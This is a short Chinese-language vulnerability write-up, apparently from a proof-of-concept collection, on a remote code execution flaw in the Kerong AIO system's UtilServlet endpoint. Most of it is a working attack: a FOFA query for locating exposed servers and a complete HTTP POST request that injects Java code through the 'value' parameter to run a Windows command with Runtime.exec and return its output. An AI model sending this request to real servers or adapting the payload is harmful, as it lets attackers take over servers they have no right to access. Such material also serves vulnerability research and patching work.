# 科荣AIO系统接口UtilServlet存在代码执行漏洞

科荣AIO UtilServlet 存在远程代码执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。

## fofa

```javascript
body="changeAccount('8000')"
```

## poc

```javascript
POST /UtilServlet HTTP/1.1
Host:127.0.0.1
User-Agent:Mozilla/5.0(Windows NT 6.1; WOW64)AppleWebKit/534.57.2(KHTML, like Gecko)Version/5.1.7Safari/534.57.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length:322

operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field
```

![920396433c98be57376c249f469ae450](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409111012822.png)